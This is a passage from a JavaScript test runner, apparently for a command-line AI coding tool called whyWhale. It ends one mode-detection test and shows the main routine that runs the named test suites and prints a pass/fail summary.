      assert(`conflicting signals "${input.slice(0,40)}" do not throw`, !threw);
      assert(`conflicting signals resolve to a valid mode`,
        ['code','debug','explain','review','architect','agent','plan','chat'].includes(ctx.mode));
    }
  }

  console.log(''); // spacing
}

// ─────────────────────────────────────────────────────────────────────────────
// MAIN — run all suites
// ─────────────────────────────────────────────────────────────────────────────

async function main() {
  console.log('\n' + bd('╔══════════════════════════════════════════╗'));
  console.log(       bd('║     🐋  whyWhale Stress Test Suite      ║'));
  console.log(       bd('╚══════════════════════════════════════════╝'));
  console.log(gr('  Working dir: ' + __dirname));
  console.log(gr('  Node:        ' + process.version));
  console.log(gr('  Started:     ' + new Date().toISOString()));

  const filter = process.argv[2]?.toLowerCase();

  const suites = [
    ['autodetect', runAutoDetect],
    ['dmpolicy',   runDmPolicy],
    ['commands',   runCommands],
    ['modes',      runModes],
    ['colors',     runColors],
    ['filesystem', runFilesystem],
    ['providers',  runProviders],
    ['stress',     runStress],
  ];

  for (const [name, fn] of suites) {
    if (filter && !name.startsWith(filter)) continue;
    try { await fn(); }
    catch (e) {
      console.log(r('\n  ✘ Suite crashed: ') + e.message);
      _failures.push(`[${name}] Suite crashed: ${e.message}`);
      _fail++;
    }
  }

  // ── Summary ───────────────────────────────────────────────────────────────
  const total = _pass + _fail + _skip;
  console.log('\n' + bd('━'.repeat(50)));
  console.log(bd('  RESULTS'));
  console.log('  ' + g(`✔ Passed: ${_pass}`));
  if (_fail > 0) console.log('  ' + r(`✘ Failed: ${_fail}`));
  if (_skip > 0) console.log('  ' + y(`⊘ Skipped: ${_skip}`));
  console.log(gr(`  Total:   ${total}`));

  if (_failures.length > 0) {
    console.log('\n' + r(bd('  FAILURES')));
    _failures.forEach((f, i) => {
      console.log('  ' + r(`${i + 1}.`) + ' ' + f);
    });
  }

  console.log(bd('━'.repeat(50)));
  const verdict = _fail === 0
    ? g(bd('  ✔ ALL TESTS PASSED'))
    : r(bd(`  ✘ ${_fail} TEST(S) FAILED`));
  console.log(verdict + '\n');

  process.exit(_fail > 0 ? 1 : 0);
}

main().catch(e => {
  console.error(r('\nFatal error: ') + e.message);
  console.error(e.stack);
  process.exit(1);
});
